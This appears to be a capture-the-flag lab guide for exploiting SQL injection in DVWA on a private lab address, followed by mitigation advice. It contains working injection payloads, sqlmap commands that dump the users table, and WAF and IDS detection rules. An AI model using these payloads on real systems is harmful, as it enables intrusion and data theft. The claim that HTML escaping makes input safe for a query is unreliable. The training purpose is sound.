# 🎯 SQL Injection Challenge: Web Application Exploitation

## 📌 Objective
Identify, exploit, and understand SQL injection vulnerabilities in a controlled environment, then learn how to protect against them.

## 🎯 Real-World Impact
SQL injection is one of the most critical web application vulnerabilities, responsible for:
- Data breaches exposing millions of records
- Unauthorized access to sensitive information
- Complete database compromise
- Financial losses and reputational damage

## 🎯 Target Information
- **Target IP**: 192.168.1.10
- **Target Service**: HTTP (Port 80)
- **Application**: DVWA (Damn Vulnerable Web Application)

## 🎓 Learning Objectives
- Understand SQL injection attack vectors and techniques
- Learn to identify vulnerable input fields
- Practice manual SQL injection exploitation
- Understand real-world impact and consequences
- Learn mitigation and prevention techniques

## 🛠️ Required Tools
- Web browser (Chrome/Firefox with developer tools)
- Burp Suite Community/Professional
- SQLmap (for automated testing)
- Nmap (for initial scanning)

## 📖 Comprehensive Guide

### 🔍 Step 1: Initial Reconnaissance
```bash
# Basic port scanning
nmap -sV -sC -p- 192.168.1.10

# Web directory enumeration
gobuster dir -u http://192.168.1.10/ -w /usr/share/wordlists/dirb/common.txt

# Check for web technologies
whatweb http://192.168.1.10/
```

### 🎯 Step 2: Manual Testing for SQL Injection
1. **Access the Target**:
   - Navigate to `http://192.168.1.10/DVWA/`
   - Login with `admin:password`
   - Set security level to "Low" in DVWA Security settings

2. **Basic Testing**:
   - In the User ID field, try entering: `1`
   - Then try: `1'` (look for SQL errors)
   - Try: `1 OR 1=1-- -` (should return all users)

3. **Determine Number of Columns**:
   ```
   1' ORDER BY 1-- -
   1' ORDER BY 2-- -
   ...
   ```
   Continue until you get an error to find the number of columns.

4. **Extract Database Information**:
   ```
   1' UNION SELECT 1,database()-- -
   ```

5. **List Tables**:
   ```
   1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -
   ```

### 🎯 Step 3: Advanced Exploitation with SQLmap
```bash
# Basic SQLmap scan
sqlmap -u "http://192.168.1.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --batch

# Dump database tables
sqlmap -u "http://192.168.1.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --tables -D dvwa

# Dump specific table data
sqlmap -u "http://192.168.1.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --dump -D dvwa -T users
```

## 🎯 Real-World Impact Analysis

### What Happens in a Real Attack?
1. **Initial Access**: Attacker finds vulnerable input field
2. **Information Gathering**: Extracts database structure
3. **Data Exfiltration**: Steals sensitive data (usernames, passwords, PII)
4. **Privilege Escalation**: Gains admin access
5. **Persistence**: Creates backdoor accounts
6. **Lateral Movement**: Exploits other systems

### Business Impact
- **Financial Losses**: Average cost of a data breach is $4.35M (IBM 2022)
- **Reputation Damage**: Loss of customer trust
- **Legal Consequences**: GDPR/CCPA violations
- **Operational Disruption**: System downtime and recovery costs

## 🛡️ Protection & Mitigation

### For Developers:
1. **Use Parameterized Queries** (Prepared Statements):
   ```python
   # Bad (Vulnerable)
   cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
   
   # Good (Secure)
   cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
   ```

2. **Input Validation**:
   - Whitelist allowed characters
   - Validate input types and formats
   - Use regular expressions to filter input

3. **Least Privilege**:
   - Database users should have minimal required permissions
   - Use different accounts for different operations
   - Example:
     ```sql
     -- Instead of one superuser, create specific roles
     CREATE ROLE web_readonly WITH LOGIN PASSWORD 'securepassword';
     GRANT SELECT ON users TO web_readonly;
     ```

4. **Web Application Firewall (WAF)**:
   - Implement WAF rules to detect and block SQL injection attempts
   - Regularly update WAF rules
   - Example ModSecurity rules:
     ```apache
     # Block common SQL injection patterns
     SecRule ARGS "(union.*select|select.*from|insert\s+into|update.+set|delete\s+from)" \
       "id:1000,phase:2,deny,status:403,msg:'SQL Injection Attempt',logdata:'%{MATCHED_VAR}'"
     ```

5. **Input Validation and Sanitization**:
   - Use allow-listing (whitelisting) instead of block-listing
   - Implement proper output encoding
   - Example in Python with Flask:
     ```python
     from markupsafe import escape
     
     @app.route('/search')
     def search():
         query = escape(request.args.get('q', ''))
         # Safe to use in query
     ```

6. **Error Handling**:
   - Use custom error pages
   - Log errors without exposing sensitive information
   - Example in PHP:
     ```php
     // In production
     ini_set('display_errors', 0);
     
     // Custom error handler
     function customError($errno, $errstr) {
         error_log("Error: [$errno] $errstr", 1, "admin@example.com");
         include('error_page.html');
         die();
     }
     set_error_handler("customError");
     ```

### For System Administrators:
1. **Regular Updates**:
   - Keep all systems and software up to date
   - Apply security patches promptly
   - Set up automatic security updates where possible
   - Monitor security mailing lists (e.g., OWASP, CERT)

2. **Database Hardening**:
   - Disable unnecessary database functions and features
   - Enable and monitor database audit logs
   - Example MySQL hardening:
     ```sql
     -- Disable local infile
     SET GLOBAL local_infile = 0;
     
     -- Enable general query log
     SET GLOBAL general_log = 'ON';
     SET GLOBAL log_output = 'TABLE';
     ```

3. **Network Segmentation**:
   - Place databases in private subnets
   - Implement proper access controls and firewalls
   - Use VPN for database access
   - Example AWS Security Group:
     ```json
     {
       "IpProtocol": "tcp",
       "FromPort": 3306,
       "ToPort": 3306,
       "IpRanges": [{"CidrIp": "10.0.1.0/24"}],
       "Description": "Allow MySQL from application servers"
     }
     ```

4. **Monitoring and Alerting**:
   - Set up IDS/IPS systems
   - Configure alerts for suspicious activities
   - Example Suricata rule:
     ```
     alert tcp any any -> $DB_SERVERS $DB_PORTS (\
         msg:"SQL Injection Attempt"; \
         flow:to_server; \
         content:"union"; \
         content:"select"; \
         distance:0; \
         within:10; \
         threshold:type limit, track by_src, count 5, seconds 60; \
         sid:1000001; rev:1;)
     ```

5. **Backup and Recovery**:
   - Regular database backups
   - Test restoration procedures
   - Store backups securely
   - Example cron job for MySQL backup:
     ```bash
     # Daily backup at 2 AM
     0 2 * * * /usr/bin/mysqldump -u backup_user -p'securepassword' --all-databases | gzip > /backups/db_`date +\%Y\%m\%d`.sql.gz
     ```

## 📚 Additional Resources
- OWASP SQL Injection Prevention Cheat Sheet
- PortSwigger SQL Injection Academy
- MITRE ATT&CK: T1190 - Exploit Public-Facing Application

## 📝 Challenge Tasks
1. Find and document the SQL injection vulnerability
2. Extract the database version
3. List all tables in the database
4. Dump the contents of the 'users' table
5. Implement a secure login page that prevents SQL injection

## 🔍 Hints
1. Start with simple test cases and observe the application's response
2. Use Burp Suite to intercept and modify requests
3. Try different SQL injection techniques (error-based, UNION-based, blind)
4. Check the server response for error messages that might reveal information
5. Use `--` (comment) to ignore the rest of the query
3. Try basic SQL injection payloads:
   - `1' OR '1'='1`
   - `1' UNION SELECT null,null--`

### Step 4: Data Extraction
1. Determine number of columns using UNION SELECT
2. Identify data types for each column
3. Extract sensitive information from database tables

## Expected Results
- Successfully bypass authentication or extract data
- Understand the underlying SQL query structure
- Identify the root cause of the vulnerability

## Flag Location
The flag can be found by extracting data from the users table in the database.

## Remediation
- Use prepared statements/parameterized queries
- Implement input validation and sanitization
- Apply principle of least privilege to database accounts
- Use web application firewalls (WAF)

## Difficulty: Easy
**Points**: 100
**Estimated Time**: 30-45 minutes
